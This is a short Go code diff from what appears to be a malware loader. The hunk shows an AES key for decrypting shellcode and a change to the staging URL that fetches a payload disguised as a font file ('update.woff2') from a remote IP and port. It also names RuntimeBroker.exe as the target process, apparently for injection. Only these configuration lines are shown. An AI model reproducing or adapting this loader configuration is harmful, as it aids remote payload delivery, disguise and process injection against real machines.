@@ -19,7 +19,7 @@ var (
 	// AES key  decrypt shellcode ( encrypt)
 	aesKeyHex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
 
-	stageURL   = "http://192.168.247.139:8080/update.woff2"
+	stageURL   = "http://100.103.4.93:9999/update.woff2"
 	targetProc = `C:\Windows\System32\RuntimeBroker.exe`
 )
 
